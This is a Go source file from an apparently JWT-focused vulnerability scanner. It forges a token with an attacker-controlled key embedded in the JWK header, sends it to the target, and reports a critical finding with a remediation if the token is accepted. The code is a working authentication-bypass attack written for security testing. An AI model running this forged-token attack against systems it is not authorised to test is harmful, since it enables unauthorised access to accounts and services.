package jwtengine

import (
	"DORM/models"
	"encoding/base64"
	"encoding/json"
)

// BuildJWKEmbedToken embeds a self-signed JWK into the JWT header.
func BuildJWKEmbedToken(origPayloadB64 string, secret []byte) string {
	jwkObj := map[string]interface{}{
		"kty": "oct",
		"k":   base64.RawURLEncoding.EncodeToString(secret),
	}
	headerMap := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
		"jwk": jwkObj,
	}
	headerJSON, _ := json.Marshal(headerMap)
	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	return models.SignHS256(headerB64, origPayloadB64, secret)
}

// RunJWKEmbedAttack (Attack 5): embeds an attacker-controlled JWK in the
// header and signs with its corresponding secret, hoping the server trusts
// the embedded key instead of its own configured key.
func RunJWKEmbedAttack(target models.ScanTarget, origPayloadB64 string, testToken func(tok, endpoint string) bool) *models.Vulnerability {
	embeddedSecret := []byte("dorm_embedded_jwk_key_2024")
	jwkTok := BuildJWKEmbedToken(origPayloadB64, embeddedSecret)
	if testToken(jwkTok, "/") {
		return &models.Vulnerability{
			Target:   target,
			Name:     "JWT JWK Header Injection (Self-Signed Key)",
			Severity: "CRITICAL",
			CVSS:     9.8,
			Description: "Server accepted a JWT containing an embedded JWK (JSON Web Key) in the header.\n" +
				"Attacker can supply their own public key and sign tokens with the corresponding private key.",
			Solution:  "Ignore 'jwk' header parameter. Only verify against pre-configured trusted keys.",
			Reference: "CVE-2018-0114 / PortSwigger JWT JWK Injection",
		}
	}
	return nil
}
